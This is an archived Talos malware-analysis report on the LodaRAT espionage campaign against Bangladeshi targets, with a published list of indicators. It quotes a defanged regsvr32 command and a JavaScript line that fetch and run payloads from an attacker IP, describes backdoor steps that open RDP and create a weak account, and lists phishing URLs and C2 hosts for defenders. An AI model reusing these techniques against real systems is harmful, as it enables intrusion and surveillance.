{
    "id": "70c36e9f-1f7d-4a29-9ea4-0addc496c66e",
    "created_at": "2023-01-12T14:59:18.204672Z",
    "updated_at": "2025-03-27T02:10:12.950725Z",
    "deleted_at": null,
    "sha1_hash": "6da9a51c6cd57aeaf1158f6233c7c642f638b2a0",
    "title": "2021-02-09 - Kasablanka Group's LodaRAT improves espionage capabilities on Android and Windows",
    "authors": "",
    "file_creation_date": "2022-05-28T15:56:37Z",
    "file_modification_date": "2022-05-28T15:56:37Z",
    "file_size": 1482628,
    "plain_text": "# Kasablanka Group's LodaRAT improves espionage capabilities on Android and Windows\n\n**[blog.talosintelligence.com/2021/02/kasablanka-lodarat.html](https://blog.talosintelligence.com/2021/02/kasablanka-lodarat.html)**\n\n_By_ _[Warren Mercer,](https://twitter.com/securitybeard)_ _[Chris Neal and](https://twitter.com/g0jirasan)_ _[Vitor Ventura.](https://twitter.com/_vventura)_\n\n[The developers of LodaRAT have added Android as a targeted platform.](https://blog.talosintelligence.com/2020/02/loda-rat-grows-up.html)\nA new iteration of LodaRAT for Windows has been identified with improved sound\nrecording capabilities.\n\n\n-----\n\nThe operators behind LodaRAT tied to a specific campaign targeting Bangladesh,\nalthough others have been seen.\nKasablanca, the group behind LodaRAT, seems to be motivated by information\ngathering and espionage rather than direct financial gain.\n\nThreat actors attempt to evolve over time and the ones behind Loda are no different. Loda\nnow has an Android version. Just like its Windows version, the Android version is also a\nremote access tool (RAT) with the features one would expect out of this kind of malware.\nThis Android RAT had been previously referred to as \"Gaza007.\" However, Talos linked it to\nthe Loda developers and uncovered a full campaign targeting Bangladeshi users. This\nshows a resourceful adversary evolving their toolkit into other platforms. It is unclear if the\ncampaign operators are the same as the developers, but there is no doubt they must work\nclosely together. To protect against this actor, each individual in an organization must be\ncareful with documents attached to emails and be vigilant before clicking on links.\nOrganizations can protect themselves by monitoring domains resolutions using Umbrella, for\ninstance, and protecting endpoints using Cisco AMP.\n\n## What's new?\n\nLodaRAT operators and/or developers now have a new tool, Loda4Android. This new\nmalware follows the same principles of other Android-based RATs that we have seen on the\nthreat landscape. Along with this new Android variant, an updated version of Loda for\nWindows has been identified in the same campaign. These new versions for Loda4Windows\nand Loda4Android show that the development effort is clearly carried out by the same group\nwe are calling \"Kasablanca.\"\n\n## How did it work?\n\nTalos identified hybrid campaigns targeting Windows and Android users. The authors\ndeveloped an Android-based RAT following the same principles as other RATs. However,\nthey specifically avoided techniques often used by banking trojans, like the Accessibility\nAPIs. The underlying command and control (C2) protocol follows the same design pattern as\nthe Windows version, suggesting that the C2 code will handle both versions. Talos\nresearchers have found both reversions reporting to the same C2 hostname and port, further\nconfirming our assertions.\n\n## So what?\n\nThe fact that the threat group has moved into hybrid campaigns targeting Windows and\nAndroid shows a group that is thriving and evolving. Giving that there are indications that the\n\n\n-----\n\ngroup using LodaRAT is looking for direct financial gain (there is no related ransomware or\nbanking activity), organizations and individuals should be aware of this threat group.\n\n### The Bangladesh campaign\n\n**Infrastructure**\n\nTalos has identified a campaign starting October 2020 and was still active at the time of\nwriting this article, which is now targeting Windows and Android platforms. The hostname\ninfo.v-pn[.]co was first recorded with malicious activity on July 2, 2020 being used as C2 for\nLoda, this is the exact same day that the domain was also registered. Ever since this date,\nthis host has been used to malicious activities related with Loda. Changing several IP\nseveral times over the past seven months.\n\nThe Windows version (see details below) uses the IP 107.172.30[.]213 as the dropper site,\nwhich hosts the download scripts (first stage) and main payload.\n\nFor this specific campaign, the malicious actors used the IP address 160.178.220[.]194 as a\nC2 and as hosting site for the Android version in its early stages, the following samples also\nchanged their C2 to info.v-pn[.]co.\n\nBased on the certificate fingerprint used to sign both Android samples, we believe the C2\nrecently changed to info.v-pn[.]co and the distribution is currently being carried out from a\nnewly identified domain lap-top[.]xyz.\n\nA development release (with an internal RFC1918 address used 192.168.1.169 as C2)\nsigned by the same certificate was submitted anonymously to VirusTotal from the same\nMoroccan geographic region as the geolocation of the IP (160.178.220[.]194) used in the\nearly stages of the campaign, which suggests that the developers of Loda4Android are\npotentially based in Morocco.\n\n**Victimology**\n\nThe operators of this Loda campaign appear to have a specific interest in Bangladesh-based\norganizations, namely banks and carrier-grade voice-over-IP software vendors, which we\nobserved on several lures attempting to distribute the malware droppers. The default victim\nID on the Windows version is \"munafa,\" which is the Urdu and Bengalese word for \"profit.\"\n\nAmong the samples we found reporting to the same C2, Talos identified the lures outlined in\nthe table below.\n\n\n-----\n\nThere are clear signs that each sample is being created by a common builder. All the\nAndroid samples we analyzed are signed by the same certificate and share the exact\nmanifest file and pre-built configuration. The base package is the same for all \"ALFurqan.Academy_v1.0\", which is a legitimate application available on the Google Play store\nand belonging to an Egyptian-based Islamic college.\n\n**Initial vector**\n\nThe distribution method used in this case is very similar to what we've seen previously.\n[Adversaries use a malicious RTF document that exploits CVE-2017-11882 — a memory](https://nvd.nist.gov/vuln/detail/CVE-2017-11882&sa=D&source=editors&ust=1612816700635000&usg=AOvVaw34CtncbA9bn4YlzhDTCyBr)\ncorruption vulnerability in Microsoft Office — that, in turn, downloads a malicious SCT file.\nFor more information on how Loda has leveraged CVE-2017-11882, please see our previous\npost on [LodaRAT.](https://blog.talosintelligence.com/2020/02/loda-rat-grows-up.html&sa=D&source=editors&ust=1612816700636000&usg=AOvVaw1W21CWaIskw64twGYdR1B2)\n\nThe documents analyzed during this investigation do not employ any obfuscation. The\npayload for the exploit is in plain text and can be easily viewed.\n\n\n-----\n\nThe second stage of this infection chain diverts from the techniques Loda has previously\nemployed. As shown above, the payload runs the following command:\n\nregsvr32 /s /u /n /i:hxxp://107[.]172[.]30[.]213/5[.]sct scrobj.dll\n\n[This is a known technique for bypassing AppLocker in Windows by abusing the regsvr32](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/regsvr32)\ncommand. Using this technique, an attacker can download and execute an SCT file while\nsimultaneously bypassing Applocker.\n\nThe malicious SCT file is essentially an XML file that contains JavaScript that downloads and\n[executes the Loda binary. We located the GitHub repository the threat actor used as a](https://github.com/api0cradle/LOLBAS/blob/master/OSBinaries/Payload/Regsvr32_calc.sct)\ntemplate for the SCT file. The comments in the template were not removed from the payload\nused in this campaign, as seen below:\n\n\n-----\n\nThe line \"\"Object.Open(\"GET\", \"hxxp://107[.]172[.]30[.]213/Flash.exe\", false);\" initiates the\ndownload of the Loda binary then executes it.\n\n## Malware\n\n### Malware design similarities\n\nBefore we delve into the malware, details it's important to explain why Talos has determined\nwith high confidence that the developers/operators behind Loda are the same behind this\nnew Loda4Android sample. Talos has found multiple similarities across the C2 protocol, code\nlevel and infrastructure. The image below shows the levels of similarity in the C2 beacon\nprotocol.\n\n\n-----\n\nTalos also found some similarities in the beacon creation routine. Both versions have two\nvariables with similar names with the same value, \"x,\" which are then used in the protocol in\nthe same positions. The figure above shows the protocol layout, in the table below you can\nsee each step.\n\nAnd in the infrastructure similarities, previous Loda campaigns used both Windows and\nAndroid samples using the same hardcoded C2 domain as Loda4Android that runs on the\nsame port.\n\nWe often find that snippets of code in malware and general app development are re-used or\nobtained from other sources. In this instance, we clearly see that this actor has potentially\nleveraged code from GitHub and this, again, is very common across app development. The\ninteresting thing here is that the protocol similarities are unlikely to have been copied by\nanother group behind Loda4Android, as this would require the C2 to have the same\ncapabilities to interact with the new Android malware.\n\n### Loda4Android malware\n\nMost commands are exactly what one would expect of an Android RAT and are summarized\nin the manifest.\n\n\n-----\n\nIt has all the components of a stalker application — the malware can record users' location\nand environment audio, as well as take photos and screenshots. It can record audio calls,\nbut only what the targeted user says, not the user on the other end of the call. The common\nSMS, call log and contact exfiltration functionalities are also present. Loda4Android is not\ncapable of intercepting SMS messages or phone calls, though, as is commonly seen in other\nbanking trojans.\n\nThis RAT reads the SMS and call log from the regular storage. It can also send SMS and\nperform calls to specific numbers. Device-wise, it acquires a list and launches applications,\nor it can play a ringtone.\n\nThere are also two other interesting features — including a built-in Facebook phishing kit. At\nthis time, the contents are hardcoded but it shouldn't be surprising that in future versions this\nmay dynamically load the content targeting other platforms.\n\nThe malware also contains a command- and script-running capability, which provides the\nmalware flexibility to perform a wide range of tasks. For example, it could download one of\nthe available Android exploits and obtain root, or it could download a new APK and install it.\nIn this case, user interaction is required. Talos also discovered the malware had been\nidentified as \"Gaza007 RAT\" in [this post, which contains a full list of commands with a short](https://ti.qianxin.com/blog/articles/Blade-hawk-The-activities-of-targeted-the-Middle-East-and-West-Asia-are-exposed/)\ndescription.\n\n\n-----\n\nThe C2 hostname and port are both hardcoded in the sample in plain text. The main C2\ncontact loop will sleep for five seconds until the network is available. Once it establishes\ncontact with the C2, it runs another loop, this time on a half-second interval.\n\nAfter starting the C2 contact service, if the bindx flag is set to 1, the malware will read a\nresource with the name \"sss,\" saving its contents into \"//sdcard/.app.apk\". This will then be\ninstalled using the standard intent mechanism provided by the operating system. This is a\ncommon method to hide the installation of the malware, hoping to disguise the malicious\napplication by also installing legitimate software, similar to the trojanized installers used on\nother platforms.\n\nThe code analysis did not show any mechanism to change the bindx flag value in runtime,\nwhich suggests this is a configuration made at build time, a commonly used malwarebuilding tool.\n\n### Windows Loda version 1.1.8\n\nThe Windows-based samples identified during this investigation are updated versions of\nLodaRAT. While mostly remaining the same as previously discovered versions, new\ncommands have been added that extend its capabilities and utilize a slightly different\ninfection chain. The new version number of 1.1.8 can be found in the initial C2 beacon, as\nshown below:\n\nMultiple commands in Loda have been updated or are entirely new additions. The most\nnotable of these commands gives the threat actor remote access to the target machine via\nRDP. To achieve this, Loda first changes a few security configurations in Windows:\n\nSet the registry entry\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal\nServer\\fDenyTSConnections\" to \"0\". This will allow RDP connections to be made.\nTurn off the Windows firewall\nAdd a user called \"-Guest\" with a password of \"123\"\nEnable logging in via network without a password by setting the registry entry\n\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Lsa\" to \"0\"\n\nAfter these changes are made, an unidentified networking utility named \"nx.exe\" establishes\na connection on the standard RDP port 3389. This utility was not observed during analysis,\nas the threat actor must send Loda a URL to download the executable from.\n\n\n-----\n\n[Another notable new command is \"Sound|\" which uses the BASS audio library to capture](https://www.un4seen.com/)\naudio from a connected microphone. Several functions are called from a BASS audio DLL\nwhich Loda has named \"bacb.dll.\" The functions that are called to record audio are:\n\nBASS_ErrorGetCode\nBASS_RecordGetDeviceInfo\nBASS_RecordInit\nBASS_RecordSetDevice\nBASS_RecordFree\nBASS_Encode_Start\nBASS_Encode_Stop\n\nThis new command is an improvement on the previous \"Sound\" command which used\nWindows' built-in Sound Recorder. The reason for abandoning the previous method is likely\nbecause Windows Sound Recorder can only record audio for a maximum of 60 seconds.\nThe new method allows for any length of recording time specified by the threat actor.\n\nFor more information on earlier versions of LodaRAT, please see our previous blogs\n[LodaRAT grows up and](https://blog.talosintelligence.com/2020/02/loda-rat-grows-up.html) [LodaRAT update: Alive and well.](https://blog.talosintelligence.com/2020/09/lodarat-update-alive-and-well.html)\n\n## Conclusion\n\nThe threat actor behind Loda is diversifying its target platforms and continuously improving\nfunctionality. Along with these improvements, the threat actor has now focused on specific\ntargets, indicating more mature operational capabilities. As is the case with earlier versions\nof Loda, both versions of this new iteration pose a serious threat, as they can lead to a\nsignificant data breach or heavy financial loss. The group has decided to deploy a crossplatform malware with some additional capabilities, suggesting they have their eyes on\ntargeting larger organizations over time. As always we encourage users to be vigilant when\nthey're clicking on or opening any links via email or SMS message. This actor has made use\n\n\n-----\n\nof squatted domains to try and preserve some legitimacy however, as detailed, these are\nmade to look familiar to the real domains to try and lure the user in without noticing.\n\n## Coverage\n\n IOCs\n\n### URLs\n\nhxxps://lap-top[.]xyz/mobile/Lap-top%20Security_Setup.apk\n\nhxxps://av24[.]co/Virus_Cleaner_Setup.msi\n\nhxxp://bdpolice[.]co/answer-paper-demo.zip\n\nhxxps://isiamibankbd[.]com/tv/TPTUMC.exe\n\nhxxps://bangladesh-bank[.]com/PBVANA.doc\n\nhxxp://bangladesh-bank[.]com/invoice.zip\n\nhxxp://zep0de.com/viewticket.exe\n\n\n-----\n\nhxxp://bracbank[.]info/munafa[.]php\n\nhxxp://107[.]172[.]30[.]213/Flash.exe\n\n### Domains\n\ninfo.v-pn[.]co\n\nlap-top[.]xyz\n\nav24[.]co\n\nbdpolice[.]co\n\nisiamibankbd[.]com\n\nbangladesh-bank[.]com\n\nzep0de.com\n\nBracbank[.]info\n\n### IPs\n\n160.178.220[.]194\n\n194.5.98[.]55\n\n107.172.30[.]213\n\nHashes\n\n91b6ea9fccb4eae21335588bc83dea09780a5b7e145721f7098baafa2072286a\n\n52b6db0fec7f587505aabfe091d8e0751acd8d4f4d120eeba5519c25a6dd8673\n\n977a9d25972b999ae3b12d12e12978f4d116b5fb713c76c57998be15b4172def\n\n68b221360edf4802b470fbc86493025707cf4913cc15729f4bc6ec149a4dc7ba\n\n59f29819d223e47099ca0f00fd6bc4335d7b95188d623bf0c78c8e594c0c69c7\n\nfbb8a86f399491ea5633df62f66bec1e4d4d5531f1dff976da1a3091b8ea4f34\n\n4fa5525008128f77562fbb64af82b2fbcbc6c0afe71d567470380dc4476184a9\n\nc3afaf555eabe5e40dcb87d2c292491e561b2dadcb1998f508088ba3bcac6836\n\n\n-----\n\n677db7d296e4bea770f99f34e70be72b8a2b910b661804592202f3a4834ef102\n\n4f319b2518d855803e678713cf4b6cae975ebdd60cc1174f1609bbb9ea76f007\n\n01f44cdc139eca65f02bfe1a8918a0d073e89bc19350262dc9d10a564863fdfd\n\n7a55844f86b49e103564750a37604954590d27686f7f7bc8e5ae6101e8e18424\n\nce2276bbb6423015a4f2e80f320e068b8f53f7c19a43fb0a6f9aa5784e716d6e\n\nbf6f5a2730ced754907e277b590959d9c734681a07a466112c392e92d008fea3\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2021/2021-02-09 - Kasablanka Group's LodaRAT improves espionage capabilities on Android and Windows.pdf"
    ],
    "report_names": [
        "2021-02-09 - Kasablanka Group's LodaRAT improves espionage capabilities on Android and Windows.pdf"
    ],
    "threat_actors": [
        {
            "id": "d4135989-e577-4133-bdae-a24243c832a4",
            "created_at": "2023-11-05T02:00:08.068657Z",
            "updated_at": "2025-03-27T02:00:03.161775Z",
            "deleted_at": null,
            "main_name": "Kasablanka",
            "aliases": [],
            "source_name": "MISPGALAXY:Kasablanka",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673535558,
    "ts_updated_at": 1743041412,
    "ts_creation_date": 1653753397,
    "ts_modification_date": 1653753397,
    "files": {
        "pdf": "https://archive.orkl.eu/6da9a51c6cd57aeaf1158f6233c7c642f638b2a0.pdf",
        "text": "https://archive.orkl.eu/6da9a51c6cd57aeaf1158f6233c7c642f638b2a0.txt",
        "img": "https://archive.orkl.eu/6da9a51c6cd57aeaf1158f6233c7c642f638b2a0.jpg"
    }
}